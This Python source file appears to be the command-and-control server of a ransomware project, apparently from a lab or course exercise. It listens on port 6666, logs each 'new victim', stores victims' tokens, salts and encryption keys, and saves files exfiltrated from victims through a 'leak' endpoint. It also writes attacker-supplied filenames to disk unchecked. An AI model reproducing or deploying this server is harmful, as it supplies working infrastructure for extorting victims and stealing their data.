import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import logging
import socketserver

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"


    def save_b64(self, token:str, data:str, filename:str):
        # decode base64 token
        token = base64.b64decode(token)
        # convert token to hex
        token = token.hex()
        # convert hex to string
        token = str(token)

        
        # make the path
        path = os.path.join(CNC.ROOT_PATH, token)

        # create the directory if it doesn't exist
        if not os.path.exists(path):
            os.mkdir(path)
        

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def save_b64_encrypted(self, token:str, data:str, filename:str):
        # decode base64 token
        token = base64.b64decode(token)
        # convert token to hex
        token = token.hex()
        # convert hex to string
        token = str(token)

        
        # make the path
        path = os.path.join(CNC.ROOT_PATH, token)

        # create the directory if it doesn't exist
        if not os.path.exists(path):
            os.mkdir(path)
        

        bin_data = base64.b64decode(data)
        # convert bin_data to UTF-8
        bin_data = bin_data.decode("utf-8")
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "w", encoding='utf8') as f:
            f.write(bin_data)



    def post_new(self, path:str, params:dict, body:dict)->dict:
        # Log the new victim
        self.log_message(f"New victim : {body}")

        try:
            # get the token, salt and key
            token = body["token"]
            salt = body["salt"]
            key = body["key"]

            # save the token, salt and key
            self.save_b64(token, salt, "salt.bin")
            self.save_b64(token, key, "key.bin")

            # return a success message
            return {"status": "OK"}
            
        except Exception as e:
            self.log_error(f"Error : {e}")
            return {"status":"KO"}

    def post_leak(self, path:str, params:dict, body:dict)->dict:
        # Log the new file
        self.log_message(f"New file : {body}")

        try:
            # get the token, filename and data
            token = body["token"]
            filename = body["filename"]
            data = body["filecontent"]

            # save the token, salt and the file
            self.save_b64(token, data, filename)

            # same but with encrypted data
            #self.save_b64_encrypted(token, data, filename)

            # return a success message
            return {"status": "OK"}
            
        except Exception as e:
            self.log_error(f"Error : {e}")
            return {"status":"KO"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()